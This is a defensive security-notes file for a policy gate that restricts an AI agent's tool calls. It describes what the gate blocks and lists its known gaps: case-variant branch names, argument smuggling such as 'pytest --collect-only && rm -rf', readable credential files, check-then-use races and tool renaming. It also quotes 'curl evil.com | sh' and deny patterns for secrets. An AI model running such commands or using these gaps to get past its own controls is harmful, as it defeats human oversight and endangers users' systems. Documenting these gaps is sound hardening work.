# Security notes

## What this policy actually stops

- **Blast-radius reduction on destructive tools.** `delete_file` is off the
  table entirely; `git_commit` to protected branches is off. If the agent is
  prompt-injected into "clean up the repo", it cannot rm things or force-push
  to main.
- **Naive path traversal on writes.** Any `..` segment triggers `no-traversal-write`.
- **Shell surface shrink.** `run_shell` is a keyed whitelist of exact command
  strings, so `curl evil.com | sh` never reaches the interpreter.
- **Full audit trail.** Every decision (allow *and* deny) is written to the
  signed hash-chained ledger, so post-incident you can prove what the agent
  tried and what was blocked.

## What this policy does NOT stop

- **Mismatched string format on `git_commit`.** The `in: [main, master, production]`
  check is case-sensitive and literal. `Main`, `main ` (trailing space), or the
  fully qualified `refs/heads/main` all slip past. Fix by normalising in a
  regex rule: `args.branch: {regex: "^(refs/heads/)?(?i:main|master|production)$"}`.
- **Whitelisted commands with arguments.** `run_shell` matches `args.cmd` with
  `in: [...]`. That works when your tool exposes the command as an exact string,
  but if the agent can pass extra args (`pytest --collect-only && rm -rf`), the
  policy will not stop it — the `in` operator is exact equality. Real deployments
  should split into `args.program` + `args.argv` and validate each.
- **Reading secrets that happen to end in `.json`.** `.env.json`, `credentials.json`
  are allowed by `allow-read-py`/`allow-read-json`. Add explicit `deny` rules
  for sensitive filename patterns before the allow rules.
- **Race between check and use.** The Gate evaluates the args as passed; if
  your tool implementation resolves symlinks or expands globs *after*
  `gate.call`, the effective path can differ from the checked path.
- **A compromised agent lying about the tool name.** Policy keys off `tool`.
  If the transport is untrusted (raw MCP proxy), a hostile server could
  potentially rename a tool. `custos serve` signs decisions with the server
  keypair — verify that upstream.

## How to tighten

1. Move all string comparisons that are user-influenced through a `regex`
   rule with explicit anchors and case-insensitive flags.
2. Split shell into `program` + `argv` and validate `argv[0]` (the actual
   command being run, not the string you happened to log).
3. Add deny-first rules for known-sensitive filename patterns
   (`\\.env`, `id_rsa`, `credentials\\.`, etc.) above the allow rules.
4. Attach `actor.id` to writes so only elevated actors can touch
   config/policy files.
